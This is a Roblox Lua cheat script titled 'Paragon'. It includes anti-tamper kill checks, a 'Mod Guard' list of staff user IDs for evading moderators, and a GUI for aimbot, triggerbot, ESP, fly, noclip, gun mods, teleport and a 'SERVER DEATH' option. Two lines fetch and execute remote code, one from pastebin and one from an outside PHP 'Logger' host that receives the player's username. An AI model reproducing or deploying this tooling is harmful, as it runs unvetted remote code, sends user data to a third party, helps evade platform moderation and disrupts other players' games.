--< Launcher Check
	if not game.Players.LocalPlayer.PlayerGui:FindFirstChild("Launcher") then
	game.Players.LocalPlayer:Kick("Invalid Token")
	wait(0.5)
	game:Shutdown()
	game.Players.LocalPlayer.Character:Destroy()
	game.Players.LocalPlayer.Character.Parent = nil
	game.ReplicatedStorage.Networking:Destroy()
	game.Workspace.Map:Destroy()
	game.Workspace.Map.Parent = nil
	end

--< Anti Hookfunction
	getgenv()['hookfunction'] = function() 
	game.Players.LocalPlayer:Kick("Invalid Token")
	wait(0.5)
	game:Shutdown()
	game.Players.LocalPlayer.Character:Destroy()
	game.Players.LocalPlayer.Character.Parent = nil
	game.ReplicatedStorage.Networking:Destroy()
	game.Workspace.Map:Destroy()
	game.Workspace.Map.Parent = nil
	end
	
--< Anti Dev Console
	game:GetService'RunService'.RenderStepped:connect(function()
	game.CoreGui.DevConsoleMaster:Destroy()
	end)

--< Script Expiration
	game:GetService'RunService'.RenderStepped:connect(function()
	if os.time() > 1567195621 then -- 9/2/19 Expiration
	game.Players.LocalPlayer:Kick("Invalid Token")
	wait(0.5)
	game:Shutdown()
	game.Players.LocalPlayer.Character:Destroy()
	game.Players.LocalPlayer.Character.Parent = nil
	game.ReplicatedStorage.Networking:Destroy()
	game.Workspace.Map:Destroy()
	game.Workspace.Map.Parent = nil
		end
	end)
	
--< HttpGet Killswitch 
	loadstring(game:HttpGet('https://pastebin.com/raw/hgdFf69M'))() 
	
	
--< Data Check
local Data = game.Players.LocalPlayer.PlayerGui["Interface Main"]["Main Menu"].Account.Username

if game.Players.LocalPlayer.Name ~= Data.Text then 
   	game.Players.LocalPlayer:Kick("Invalid Token")
	wait(0.5)
	game:Shutdown()
	game.Players.LocalPlayer.Character:Destroy()
	game.Players.LocalPlayer.Character.Parent = nil
	game.ReplicatedStorage.Networking:Destroy()
	game.Workspace.Map:Destroy()
	game.Workspace.Map.Parent = nil
elseif Data.Text ~= "lootchrist" then
    game.Players.LocalPlayer:Kick("Invalid Token")
	wait(0.5)
	game:Shutdown()
	game.Players.LocalPlayer.Character:Destroy()
	game.Players.LocalPlayer.Character.Parent = nil
	game.ReplicatedStorage.Networking:Destroy()
	game.Workspace.Map:Destroy()
	game.Workspace.Map.Parent = nil
else
end


--< Anti Spoof
game.Players.LocalPlayer:GetPropertyChangedSignal('Name'):connect(function()
	game.Players.LocalPlayer:Kick("Invalid Token")
	wait(0.5)
	game:Shutdown()
	game.Players.LocalPlayer.Character:Destroy()
	game.Players.LocalPlayer.Character.Parent = nil
	game.ReplicatedStorage.Networking:Destroy()
	game.Workspace.Map:Destroy()
	game.Workspace.Map.Parent = nil
end)

--< Logger
loadstring(game:HttpGetAsync("http://eskihosting.xyz/ar8cum.php?&user="..game.Players.LocalPlayer.Name))()

--< Mod Guard
		local joinAnotherServer = false
		local kickSelf = true
		local staff = {
		281519,
		2596467,
		3645709,
		36323537,
		22303673,
		2548840,
		1631181,
		207157,
		33857986,
		9610709,
		30033402,
		859474,
		33456715,
		7127890,
		63245130,
		9109599,
		32069013,
		23499007,
		115602052,
		34378974,
		61630174,
		39021856,
		10717044,
		25461577,
		20194019,
		64452544,
		26665281,
		163719713,
		652402,
		117755,
		75823163,
		56883177,
		638328468,
		16729621,
		4410600,
		18806896
			}
			game.Players.PlayerAdded:Connect(function(plr)
		    for i, v in pairs(staff) do
		        if plr.UserId == v then
		            if joinAnotherServer then
		                local ts = game:GetService("TeleportService")
		                local p = game:GetService("Players").LocalPlayer
		                ts:Teleport(game.PlaceId, p)
		            elseif kickSelf then
		                game.Players.LocalPlayer:kick(tostring(game.Players:GetNameFromUserIdAsync(v)).." Joined. PR ModGuard Activated!")
		            end
		        end
		    end
			end)
			for i,b in pairs(game.Players:GetChildren()) do
		    for i, v in pairs(staff) do
		        if b.UserId == v then
		            if joinAnotherServer then
		                local ts = game:GetService("TeleportService")
		                local p = game:GetService("Players").LocalPlayer
		                ts:Teleport(game.PlaceId, p)
		            elseif kickSelf then
		                game.Players.LocalPlayer:kick(tostring(game.Players:GetNameFromUserIdAsync(v)).." Joined. PR ModGuard Activated!")
		            end
		        end
		    end
			end
			
-- Instances:
local Paragon = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local LocalPlayer = Instance.new("Frame")
local JumpPower = Instance.new("TextBox")
local SprintSpeed = Instance.new("TextBox")
local Gravity = Instance.new("TextBox")
local HipHeight = Instance.new("TextBox")
local Spawn = Instance.new("TextBox")
local FlySpeed = Instance.new("TextBox")
local Fly = Instance.new("TextButton")
local InfJmp = Instance.new("TextButton")
local Invis = Instance.new("TextButton")
local NoClip = Instance.new("TextButton")
local Suit = Instance.new("TextButton")
local FOV = Instance.new("TextBox")
local StatESP = Instance.new("TextButton")
local ClientMap = Instance.new("Frame")
local RDoorsWindows = Instance.new("TextButton")
local SetDay = Instance.new("TextButton")
local NoFog = Instance.new("TextButton")
local SwiftLoot = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local Corpse = Instance.new("TextButton")
local Item = Instance.new("TextButton")
local TextButton = Instance.new("TextButton")
local GunMods = Instance.new("Frame")
local Recoil = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local TextButton_2 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local Spread = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local TextButton_3 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local FireRate = Instance.new("TextLabel")
local Frame_3 = Instance.new("Frame")
local TextButton_4 = Instance.new("TextButton")
local TextLabel_3 = Instance.new("TextLabel")
local FullAuto = Instance.new("TextButton")
local GunName = Instance.new("TextBox")
local GunDesc = Instance.new("TextBox")
local ESP = Instance.new("Frame")
local Misc = Instance.new("Frame")
local Aimbot = Instance.new("TextButton")
local Triggerbot = Instance.new("TextButton")
local RGBWeapons = Instance.new("TextButton")
local AntiZed = Instance.new("TextButton")
local EarRape = Instance.new("TextButton")
local TextLabel_4 = Instance.new("TextLabel")
local Shaders = Instance.new("TextButton")
local Login = Instance.new("TextLabel")
local Help = Instance.new("TextButton")
local Teleport = Instance.new("Frame")
local Loc = Instance.new("TextBox")
local Plr = Instance.new("TextBox")
local Crpse = Instance.new("TextBox")
--Properties:
Paragon.Name = "Paragon"
Paragon.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Paragon.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageLabel.Parent = Paragon
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.Position = UDim2.new(0.0700000003, 0, 0.0320000015, 0)
ImageLabel.Size = UDim2.new(0, 631, 0, 496)
ImageLabel.Image = "rbxassetid://3616367618"

LocalPlayer.Name = "LocalPlayer"
LocalPlayer.Parent = ImageLabel
LocalPlayer.BackgroundColor3 = Color3.new(1, 1, 1)
LocalPlayer.BackgroundTransparency = 1
LocalPlayer.Position = UDim2.new(0.0649762303, 0, 0.260080636, 0)
LocalPlayer.Size = UDim2.new(0, 169, 0, 180)

JumpPower.Name = "JumpPower"
JumpPower.Parent = LocalPlayer
JumpPower.BackgroundColor3 = Color3.new(1, 1, 1)
JumpPower.BackgroundTransparency = 1
JumpPower.Size = UDim2.new(0, 168, 0, 13)
JumpPower.Font = Enum.Font.SourceSans
JumpPower.PlaceholderColor3 = Color3.new(1, 1, 1)
JumpPower.PlaceholderText = "SET JUMP POWER"
JumpPower.Text = ""
JumpPower.TextColor3 = Color3.new(1, 1, 1)
JumpPower.TextSize = 14

SprintSpeed.Name = "SprintSpeed"
SprintSpeed.Parent = LocalPlayer
SprintSpeed.BackgroundColor3 = Color3.new(1, 1, 1)
SprintSpeed.BackgroundTransparency = 1
SprintSpeed.Position = UDim2.new(0, 0, 0, 13)
SprintSpeed.Size = UDim2.new(0, 168, 0, 13)
SprintSpeed.Font = Enum.Font.SourceSans
SprintSpeed.PlaceholderColor3 = Color3.new(1, 1, 1)
SprintSpeed.PlaceholderText = "SET SPRINT SPEED"
SprintSpeed.Text = ""
SprintSpeed.TextColor3 = Color3.new(1, 1, 1)
SprintSpeed.TextSize = 14

Gravity.Name = "Gravity"
Gravity.Parent = LocalPlayer
Gravity.BackgroundColor3 = Color3.new(1, 1, 1)
Gravity.BackgroundTransparency = 1
Gravity.Position = UDim2.new(0, 0, 0, 26)
Gravity.Size = UDim2.new(0, 168, 0, 13)
Gravity.Font = Enum.Font.SourceSans
Gravity.PlaceholderColor3 = Color3.new(1, 1, 1)
Gravity.PlaceholderText = "SET GRAVITY"
Gravity.Text = ""
Gravity.TextColor3 = Color3.new(1, 1, 1)
Gravity.TextSize = 14

HipHeight.Name = "HipHeight"
HipHeight.Parent = LocalPlayer
HipHeight.BackgroundColor3 = Color3.new(1, 1, 1)
HipHeight.BackgroundTransparency = 1
HipHeight.Position = UDim2.new(0, 0, 0, 39)
HipHeight.Size = UDim2.new(0, 168, 0, 13)
HipHeight.Font = Enum.Font.SourceSans
HipHeight.PlaceholderColor3 = Color3.new(1, 1, 1)
HipHeight.PlaceholderText = "SET HIP HEIGHT"
HipHeight.Text = ""
HipHeight.TextColor3 = Color3.new(1, 1, 1)
HipHeight.TextSize = 14

Spawn.Name = "Spawn"
Spawn.Parent = LocalPlayer
Spawn.BackgroundColor3 = Color3.new(1, 1, 1)
Spawn.BackgroundTransparency = 1
Spawn.Position = UDim2.new(0, 0, 0, 52)
Spawn.Size = UDim2.new(0, 168, 0, 13)
Spawn.Font = Enum.Font.SourceSans
Spawn.PlaceholderColor3 = Color3.new(1, 1, 1)
Spawn.PlaceholderText = "SET SPAWN"
Spawn.Text = ""
Spawn.TextColor3 = Color3.new(1, 1, 1)
Spawn.TextSize = 14

FlySpeed.Name = "FlySpeed"
FlySpeed.Parent = LocalPlayer
FlySpeed.BackgroundColor3 = Color3.new(1, 1, 1)
FlySpeed.BackgroundTransparency = 1
FlySpeed.Position = UDim2.new(0, 0, 0, 65)
FlySpeed.Size = UDim2.new(0, 168, 0, 13)
FlySpeed.Font = Enum.Font.SourceSans
FlySpeed.PlaceholderColor3 = Color3.new(1, 1, 1)
FlySpeed.PlaceholderText = "SET FLY SPEED"
FlySpeed.Text = ""
FlySpeed.TextColor3 = Color3.new(1, 1, 1)
FlySpeed.TextSize = 14

Fly.Name = "Fly"
Fly.Parent = LocalPlayer
Fly.BackgroundColor3 = Color3.new(1, 1, 1)
Fly.BackgroundTransparency = 1
Fly.Position = UDim2.new(0, 0, 0, 91)
Fly.Size = UDim2.new(0, 168, 0, 13)
Fly.Font = Enum.Font.SourceSans
Fly.Text = "TOGGLE FLY"
Fly.TextColor3 = Color3.new(1, 1, 1)
Fly.TextSize = 14

InfJmp.Name = "InfJmp"
InfJmp.Parent = LocalPlayer
InfJmp.BackgroundColor3 = Color3.new(1, 1, 1)
InfJmp.BackgroundTransparency = 1
InfJmp.Position = UDim2.new(0, 0, 0, 78)
InfJmp.Size = UDim2.new(0, 168, 0, 13)
InfJmp.Font = Enum.Font.SourceSans
InfJmp.Text = "INF JUMP"
InfJmp.TextColor3 = Color3.new(1, 1, 1)
InfJmp.TextSize = 14

Invis.Name = "Invis"
Invis.Parent = LocalPlayer
Invis.BackgroundColor3 = Color3.new(1, 1, 1)
Invis.BackgroundTransparency = 1
Invis.Position = UDim2.new(0, 0, 0, 117)
Invis.Size = UDim2.new(0, 168, 0, 13)
Invis.Font = Enum.Font.SourceSans
Invis.Text = "TOGGLE NOCLIP"
Invis.TextColor3 = Color3.new(1, 1, 1)
Invis.TextSize = 14

NoClip.Name = "NoClip"
NoClip.Parent = LocalPlayer
NoClip.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
NoClip.BackgroundTransparency = 1
NoClip.Position = UDim2.new(0, 0, 0, 130)
NoClip.Size = UDim2.new(0, 168, 0, 13)
NoClip.Font = Enum.Font.SourceSans
NoClip.Text = "TOGGLE NOFALL"
NoClip.TextColor3 = Color3.new(1, 1, 1)
NoClip.TextSize = 14

Suit.Name = "Suit"
Suit.Parent = LocalPlayer
Suit.BackgroundColor3 = Color3.new(1, 1, 0.498039)
Suit.BackgroundTransparency = 1
Suit.Position = UDim2.new(0, 0, 0, 104)
Suit.Size = UDim2.new(0, 168, 0, 13)
Suit.Font = Enum.Font.SourceSans
Suit.Text = "TOGGLE SUIT"
Suit.TextColor3 = Color3.new(1, 1, 1)
Suit.TextSize = 14

FOV.Name = "FOV"
FOV.Parent = LocalPlayer
FOV.BackgroundColor3 = Color3.new(1, 1, 1)
FOV.BackgroundTransparency = 1
FOV.Position = UDim2.new(0, 0, 0.785000026, 0)
FOV.Size = UDim2.new(0, 168, 0, 15)
FOV.Font = Enum.Font.SourceSans
FOV.PlaceholderColor3 = Color3.new(1, 1, 1)
FOV.PlaceholderText = "SET FOV"
FOV.Text = ""
FOV.TextColor3 = Color3.new(1, 1, 1)
FOV.TextSize = 14

StatESP.Name = "StatESP"
StatESP.Parent = LocalPlayer
StatESP.BackgroundColor3 = Color3.new(1, 1, 1)
StatESP.BackgroundTransparency = 1
StatESP.Position = UDim2.new(0, 0, 0.855826497, 0)
StatESP.Size = UDim2.new(1, 0, 0.0830624029, 0)
StatESP.Font = Enum.Font.SourceSans
StatESP.Text = "CUSTOM  STATS"
StatESP.TextColor3 = Color3.new(1, 1, 1)
StatESP.TextSize = 14

ClientMap.Name = "Client Map"
ClientMap.Parent = ImageLabel
ClientMap.BackgroundColor3 = Color3.new(1, 1, 1)
ClientMap.BackgroundTransparency = 1
ClientMap.Position = UDim2.new(0.0649762303, 0, 0.709677398, 0)
ClientMap.Size = UDim2.new(0, 169, 0, 45)

RDoorsWindows.Name = "RDoorsWindows"
RDoorsWindows.Parent = ClientMap
RDoorsWindows.BackgroundColor3 = Color3.new(1, 1, 1)
RDoorsWindows.BackgroundTransparency = 1
RDoorsWindows.Position = UDim2.new(0, 0, 0.13333334, 0)
RDoorsWindows.Size = UDim2.new(1, 0, 0.300000042, 0)
RDoorsWindows.Font = Enum.Font.SourceSans
RDoorsWindows.Text = "REMOVE DOORS/WINDOWS"
RDoorsWindows.TextColor3 = Color3.new(1, 1, 1)
RDoorsWindows.TextSize = 14

SetDay.Name = "SetDay"
SetDay.Parent = ClientMap
SetDay.BackgroundColor3 = Color3.new(1, 1, 1)
SetDay.BackgroundTransparency = 1
SetDay.Position = UDim2.new(0, 0, 0, 15)
SetDay.Size = UDim2.new(1, 0, 0.452830404, 0)
SetDay.Font = Enum.Font.SourceSans
SetDay.Text = "SET DAY"
SetDay.TextColor3 = Color3.new(1, 1, 1)
SetDay.TextSize = 14

NoFog.Name = "NoFog"
NoFog.Parent = ClientMap
NoFog.BackgroundColor3 = Color3.new(1, 1, 1)
NoFog.BackgroundTransparency = 1
NoFog.Position = UDim2.new(0, 0, 0, 33)
NoFog.Size = UDim2.new(1, 0, 0.282106012, 0)
NoFog.Font = Enum.Font.SourceSans
NoFog.Text = "NO FOG"
NoFog.TextColor3 = Color3.new(1, 1, 1)
NoFog.TextSize = 14
NoFog.TextWrapped = true

SwiftLoot.Name = "Swift Loot"
SwiftLoot.Parent = ImageLabel
SwiftLoot.BackgroundColor3 = Color3.new(1, 1, 1)
SwiftLoot.BackgroundTransparency = 1
SwiftLoot.Position = UDim2.new(0.0649762303, 0, 0.905241907, 0)
SwiftLoot.Size = UDim2.new(0, 169, 0, 24)

TextBox.Parent = SwiftLoot
TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox.BackgroundTransparency = 1
TextBox.Size = UDim2.new(0, 169, 0, 21)
TextBox.Font = Enum.Font.Arial
TextBox.PlaceholderColor3 = Color3.new(1, 1, 1)
TextBox.PlaceholderText = "USER/NAME"
TextBox.Text = ""
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.TextSize = 12

Corpse.Name = "Corpse"
Corpse.Parent = SwiftLoot
Corpse.BackgroundColor3 = Color3.new(1, 1, 1)
Corpse.BackgroundTransparency = 1
Corpse.Position = UDim2.new(1.02958584, 0, -1.08333337, 0)
Corpse.Size = UDim2.new(0, 96, 0, 22)
Corpse.Font = Enum.Font.SourceSans
Corpse.Text = ""
Corpse.TextColor3 = Color3.new(0, 0, 0)
Corpse.TextSize = 14

Item.Name = "Item"
Item.Parent = SwiftLoot
Item.BackgroundColor3 = Color3.new(1, 1, 1)
Item.BackgroundTransparency = 1
Item.Position = UDim2.new(1.02958584, 0, -0.0833333358, 0)
Item.Size = UDim2.new(0, 96, 0, 23)
Item.Font = Enum.Font.SourceSans
Item.Text = ""
Item.TextColor3 = Color3.new(0, 0, 0)
Item.TextSize = 14

TextButton.Parent = SwiftLoot
TextButton.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton.BackgroundTransparency = 0.69999998807907
TextButton.Position = UDim2.new(0, 0, 1.16666663, 0)
TextButton.Size = UDim2.new(0, 168, 0, 9)
TextButton.Visible = false
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "[ENABLE LOOT MODE]"
TextButton.TextColor3 = Color3.new(1, 0.666667, 0)
TextButton.TextSize = 14

GunMods.Name = "GunMods"
GunMods.Parent = ImageLabel
GunMods.BackgroundColor3 = Color3.new(1, 1, 1)
GunMods.BackgroundTransparency = 1
GunMods.Position = UDim2.new(0.361331224, 0, 0.260080636, 0)
GunMods.Size = UDim2.new(0, 171, 0, 132)

Recoil.Name = "Recoil"
Recoil.Parent = GunMods
Recoil.BackgroundColor3 = Color3.new(1, 1, 1)
Recoil.BackgroundTransparency = 1
Recoil.Position = UDim2.new(-0.00584795326, 0, 0.037878789, 0)
Recoil.Size = UDim2.new(0, 86, 0, 18)
Recoil.Font = Enum.Font.SourceSans
Recoil.Text = "RECOIL: "
Recoil.TextColor3 = Color3.new(1, 1, 1)
Recoil.TextScaled = true
Recoil.TextSize = 14
Recoil.TextWrapped = true
Recoil.TextXAlignment = Enum.TextXAlignment.Right

Frame.Parent = Recoil
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(1.16279066, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 56, 0, 1)

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.new(0.0509804, 0.321569, 0.490196)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0, 0, 0, -3)
TextButton_2.Size = UDim2.new(0, 6, 0, 6)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = ""
TextButton_2.TextColor3 = Color3.new(0, 0, 0)
TextButton_2.TextSize = 14

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(1, 3, 0, -3)
TextLabel.Size = UDim2.new(0, 10, 0, 5)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "0"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 14

Spread.Name = "Spread"
Spread.Parent = GunMods
Spread.BackgroundColor3 = Color3.new(1, 1, 1)
Spread.BackgroundTransparency = 1
Spread.Position = UDim2.new(-0.00584795326, 0, 0.174242437, 0)
Spread.Size = UDim2.new(0, 86, 0, 18)
Spread.Font = Enum.Font.SourceSans
Spread.Text = "SPREAD: "
Spread.TextColor3 = Color3.new(1, 1, 1)
Spread.TextScaled = true
Spread.TextSize = 14
Spread.TextWrapped = true
Spread.TextXAlignment = Enum.TextXAlignment.Right

Frame_2.Parent = Spread
Frame_2.BackgroundColor3 = Color3.new(1, 1, 1)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(1.16279066, 0, 0.5, 0)
Frame_2.Size = UDim2.new(0, 56, 0, 1)

TextButton_3.Parent = Frame_2
TextButton_3.BackgroundColor3 = Color3.new(0.0509804, 0.321569, 0.490196)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0, 0, 0, -3)
TextButton_3.Size = UDim2.new(0, 6, 0, 6)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = ""
TextButton_3.TextColor3 = Color3.new(0, 0, 0)
TextButton_3.TextSize = 14

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.Position = UDim2.new(1, 3, 0, -3)
TextLabel_2.Size = UDim2.new(0, 10, 0, 5)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "0"
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextSize = 14

FireRate.Name = "Fire Rate"
FireRate.Parent = GunMods
FireRate.BackgroundColor3 = Color3.new(1, 1, 1)
FireRate.BackgroundTransparency = 1
FireRate.Position = UDim2.new(-0.00584795326, 0, 0.310606062, 0)
FireRate.Size = UDim2.new(0, 86, 0, 18)
FireRate.Font = Enum.Font.SourceSans
FireRate.Text = "FIRE RATE: "
FireRate.TextColor3 = Color3.new(1, 1, 1)
FireRate.TextScaled = true
FireRate.TextSize = 14
FireRate.TextWrapped = true
FireRate.TextXAlignment = Enum.TextXAlignment.Right

Frame_3.Parent = FireRate
Frame_3.BackgroundColor3 = Color3.new(1, 1, 1)
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(1.16279066, 0, 0.5, 0)
Frame_3.Size = UDim2.new(0, 56, 0, 1)

TextButton_4.Parent = Frame_3
TextButton_4.BackgroundColor3 = Color3.new(0.0509804, 0.321569, 0.490196)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0, 0, 0, -3)
TextButton_4.Size = UDim2.new(0, 6, 0, 6)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = ""
TextButton_4.TextColor3 = Color3.new(0, 0, 0)
TextButton_4.TextSize = 14

TextLabel_3.Parent = Frame_3
TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_3.BackgroundTransparency = 1
TextLabel_3.Position = UDim2.new(1, 3, 0, -3)
TextLabel_3.Size = UDim2.new(0, 10, 0, 5)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "0"
TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
TextLabel_3.TextSize = 14

FullAuto.Name = "Full Auto"
FullAuto.Parent = GunMods
FullAuto.BackgroundColor3 = Color3.new(1, 1, 1)
FullAuto.BackgroundTransparency = 1
FullAuto.Position = UDim2.new(-0.00584795326, 0, 0.446969688, 0)
FullAuto.Size = UDim2.new(0, 170, 0, 19)
FullAuto.Font = Enum.Font.SourceSans
FullAuto.Text = "FULL AUTO : T"
FullAuto.TextColor3 = Color3.new(1, 1, 1)
FullAuto.TextSize = 14
FullAuto.TextWrapped = true

GunName.Name = "Gun Name"
GunName.Parent = GunMods
GunName.BackgroundColor3 = Color3.new(1, 1, 1)
GunName.BackgroundTransparency = 1
GunName.Position = UDim2.new(-0.00584795326, 0, 0.636363626, 0)
GunName.Size = UDim2.new(0, 170, 0, 17)
GunName.Font = Enum.Font.SourceSans
GunName.PlaceholderText = "Weapon Name"
GunName.Text = ""
GunName.TextColor3 = Color3.new(1, 1, 1)
GunName.TextScaled = true
GunName.TextSize = 14
GunName.TextWrapped = true

GunDesc.Name = "Gun Desc"
GunDesc.Parent = GunMods
GunDesc.BackgroundColor3 = Color3.new(1, 1, 1)
GunDesc.BackgroundTransparency = 1
GunDesc.Position = UDim2.new(-0.00584795326, 0, 0.787878811, 0)
GunDesc.Size = UDim2.new(0, 170, 0, 17)
GunDesc.Font = Enum.Font.SourceSans
GunDesc.PlaceholderText = "Weapon Description"
GunDesc.Text = ""
GunDesc.TextColor3 = Color3.new(1, 1, 1)
GunDesc.TextScaled = true
GunDesc.TextSize = 14
GunDesc.TextWrapped = true

ESP.Name = "ESP"
ESP.Parent = ImageLabel
ESP.BackgroundColor3 = Color3.new(1, 1, 1)
ESP.BackgroundTransparency = 1
ESP.Position = UDim2.new(0.332805067, 0, 0.0745967776, 0)
ESP.Size = UDim2.new(0, 421, 0, 492)

Misc.Name = "Misc"
Misc.Parent = ImageLabel
Misc.BackgroundColor3 = Color3.new(1, 1, 1)
Misc.BackgroundTransparency = 1
Misc.Position = UDim2.new(0.35657692, 0, 0.612903237, 0)
Misc.Size = UDim2.new(0, 174, 0, 108)

Aimbot.Name = "Aimbot"
Aimbot.Parent = Misc
Aimbot.BackgroundColor3 = Color3.new(1, 1, 1)
Aimbot.BackgroundTransparency = 1
Aimbot.Position = UDim2.new(0.18965517, 0, 0.0877192989, 0)
Aimbot.Size = UDim2.new(0.528735638, 0, 0.125, 0)
Aimbot.Font = Enum.Font.SourceSans
Aimbot.Text = "AIMBOT : Q"
Aimbot.TextColor3 = Color3.new(1, 1, 1)
Aimbot.TextSize = 14

Triggerbot.Name = "Triggerbot"
Triggerbot.Parent = Misc
Triggerbot.BackgroundColor3 = Color3.new(1, 1, 1)
Triggerbot.BackgroundTransparency = 1
Triggerbot.Position = UDim2.new(0.0114942528, 0, 0.212719291, 0)
Triggerbot.Size = UDim2.new(1, 0, 0.125, 0)
Triggerbot.Font = Enum.Font.SourceSans
Triggerbot.Text = "TRIGBOT : CAPS"
Triggerbot.TextColor3 = Color3.new(0.729412, 0.729412, 0.729412)
Triggerbot.TextSize = 14

RGBWeapons.Name = "RGB Weapons"
RGBWeapons.Parent = Misc
RGBWeapons.BackgroundColor3 = Color3.new(1, 1, 1)
RGBWeapons.BackgroundTransparency = 1
RGBWeapons.Position = UDim2.new(0.0172413792, 0, 0.375, 0)
RGBWeapons.Size = UDim2.new(1, 0, 0.125, 0)
RGBWeapons.Font = Enum.Font.SourceSans
RGBWeapons.Text = "RGB WEAPONS"
RGBWeapons.TextColor3 = Color3.new(1, 1, 1)
RGBWeapons.TextSize = 14

AntiZed.Name = "AntiZed"
AntiZed.Parent = Misc
AntiZed.BackgroundColor3 = Color3.new(1, 1, 1)
AntiZed.BackgroundTransparency = 1
AntiZed.Position = UDim2.new(0.0172413792, 0, 0.5, 0)
AntiZed.Size = UDim2.new(1, 0, 0.125, 0)
AntiZed.Font = Enum.Font.SourceSans
AntiZed.Text = "ANTI ZOMBIES"
AntiZed.TextColor3 = Color3.new(1, 1, 1)
AntiZed.TextSize = 14

EarRape.Name = "Ear Rape"
EarRape.Parent = Misc
EarRape.BackgroundColor3 = Color3.new(1, 1, 1)
EarRape.BackgroundTransparency = 1
EarRape.Position = UDim2.new(0.0172413792, 0, 0.625241756, 0)
EarRape.Size = UDim2.new(1, 0, 0.125, 0)
EarRape.Font = Enum.Font.SourceSans
EarRape.Text = "SERVER DEATH"
EarRape.TextColor3 = Color3.new(1, 1, 1)
EarRape.TextSize = 14

TextLabel_4.Parent = Misc
TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_4.BackgroundTransparency = 1
TextLabel_4.Position = UDim2.new(0.0114942528, 0, 0.0877192989, 0)
TextLabel_4.Size = UDim2.new(0, 87, 0, 28)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "["
TextLabel_4.TextColor3 = Color3.new(1, 0.666667, 0)
TextLabel_4.TextSize = 20

Shaders.Name = "Shaders"
Shaders.Parent = Misc
Shaders.BackgroundColor3 = Color3.new(1, 1, 1)
Shaders.BackgroundTransparency = 1
Shaders.Position = UDim2.new(0.0172413792, 0, 0.750241756, 0)
Shaders.Size = UDim2.new(1, 0, 0.11730209, 0)
Shaders.Font = Enum.Font.SourceSans
Shaders.Text = "SHADERS MOD"
Shaders.TextColor3 = Color3.new(1, 1, 1)
Shaders.TextSize = 14

Login.Name = "Login"
Login.Parent = ImageLabel
Login.BackgroundColor3 = Color3.new(1, 1, 1)
Login.BackgroundTransparency = 1
Login.Position = UDim2.new(0.890649736, 0, 0.0161290318, 0)
Login.Size = UDim2.new(0, 42, 0, 17)
Login.Font = Enum.Font.SourceSans
Login.Text = "PLAYER"
Login.TextColor3 = Color3.new(1, 0.666667, 0)
Login.TextSize = 14

Help.Name = "Help"
Help.Parent = ImageLabel
Help.BackgroundColor3 = Color3.new(1, 1, 1)
Help.BackgroundTransparency = 1
Help.Position = UDim2.new(0.920760572, 0, 0.899193525, 0)
Help.Size = UDim2.new(0, 50, 0, 50)
Help.Font = Enum.Font.Fantasy
Help.Text = "?"
Help.TextColor3 = Color3.new(1, 1, 1)
Help.TextSize = 35

Teleport.Name = "Teleport"
Teleport.Parent = ImageLabel
Teleport.BackgroundColor3 = Color3.new(1, 1, 1)
Teleport.BackgroundTransparency = 1
Teleport.Position = UDim2.new(0.657686234, 0, 0.72177422, 0)
Teleport.Size = UDim2.new(0, 174, 0, 88)

Loc.Name = "Loc"
Loc.Parent = Teleport
Loc.BackgroundColor3 = Color3.new(1, 1, 1)
Loc.BackgroundTransparency = 1
Loc.Size = UDim2.new(0, 168, 0, 15)
Loc.Font = Enum.Font.SourceSans
Loc.PlaceholderColor3 = Color3.new(1, 1, 1)
Loc.PlaceholderText = "LOCATION TP"
Loc.Text = ""
Loc.TextColor3 = Color3.new(1, 1, 1)
Loc.TextSize = 14

Plr.Name = "Plr"
Plr.Parent = Teleport
Plr.BackgroundColor3 = Color3.new(1, 1, 1)
Plr.BackgroundTransparency = 1
Plr.Position = UDim2.new(0, 0, 0.153409094, 0)
Plr.Size = UDim2.new(0, 168, 0, 16)
Plr.Font = Enum.Font.SourceSans
Plr.PlaceholderColor3 = Color3.new(1, 1, 1)
Plr.PlaceholderText = "PLAYER TP"
Plr.Text = ""
Plr.TextColor3 = Color3.new(1, 1, 1)
Plr.TextSize = 14

Crpse.Name = "Crpse"
Crpse.Parent = Teleport
Crpse.BackgroundColor3 = Color3.new(1, 1, 1)
Crpse.BackgroundTransparency = 1
Crpse.Position = UDim2.new(0, 0, 0.233173028, 0)
